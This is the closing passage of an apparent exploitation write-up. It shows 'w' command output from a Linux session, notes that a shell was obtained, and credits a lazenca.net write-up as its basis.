USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               13:05    2:20m  6:14   0.05s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
```

Just like that, we popped a shell!

Once again, this writeup is based off of this really great writeup: https://www.lazenca.net/pages/viewpage.action?pageId=7536654

